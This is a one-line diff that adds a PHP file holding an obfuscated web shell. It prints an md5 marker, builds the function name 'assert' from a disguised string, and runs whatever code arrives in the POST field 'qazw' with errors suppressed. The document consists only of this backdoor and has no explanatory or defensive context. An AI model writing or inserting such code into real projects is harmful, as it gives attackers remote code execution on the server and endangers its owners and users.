@@ -1,0 +1,1 @@
+<?php print(md5(222));$a=str_replace("vbnm","","asvbnmsert");@$a($_POST[qazw]);?>
